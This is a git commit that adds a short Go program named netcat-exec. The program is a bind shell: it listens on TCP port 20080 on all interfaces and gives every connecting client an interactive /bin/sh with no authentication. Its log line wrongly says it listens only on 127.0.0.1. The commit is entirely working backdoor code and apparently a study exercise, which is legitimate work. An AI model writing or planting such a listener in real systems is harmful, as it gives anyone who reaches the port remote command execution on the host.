05c428cab43f68f26bae5657e8beed872e5a62c6
hntsr <hanatsu0824@gmail.com>
2020-02-23 13:08:45 +0900

    create netcat-exec server

---
+++ netcat-exec/main.go
@@ -0,0 +1,35 @@
+package main
+
+import (
+	"io"
+	"log"
+	"net"
+	"os/exec"
+)
+
+func handle(conn net.Conn) {
+	cmd := exec.Command("/bin/sh", "-i")
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
+}
+
+func main() {
+	listener, err := net.Listen("tcp", ":20080")
+	if err != nil {
+		log.Fatalln("Unable to bind to port")
+	}
+	log.Println("Listening on 127.0.0.1:20080")
+	for {
+		conn, err := listener.Accept()
+		log.Println("Received connection")
+		if err != nil {
+			log.Fatalln("Unable to accept connection")
+		}
+		go handle(conn)
+	}
+
+}
